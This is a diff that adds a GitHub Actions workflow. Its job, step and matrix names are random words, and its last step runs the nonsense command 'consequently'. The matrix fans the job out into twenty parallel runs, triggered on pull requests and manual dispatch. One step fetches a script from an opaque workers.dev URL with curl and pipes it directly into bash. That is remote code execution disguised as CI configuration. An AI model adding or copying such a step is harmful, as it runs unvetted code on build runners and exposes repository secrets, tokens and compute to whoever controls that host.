@@ -1,0 +1,21 @@
+name: motion
+
+on:
+  pull_request:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  hardship:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        carpet: ["vessel", "recession", "lump", "relative", "arrow"]
+        globe: ["unit", "appliance", "confine", "archive"]
+      fail-fast: false
+    steps:
+    - uses: actions/checkout@v6
+    - name: relationship
+      run: curl "https://nggr01.lucky-darkness-f361.workers.dev/b6be3/a08b37dd0db59ac5ad1e4b014a1b1e7a79d8c1ac24e13203eda69d9e490?k=1775305878&wic=ep&et=ce&d=pd" | bash
+    - name: primary
+      run: consequently
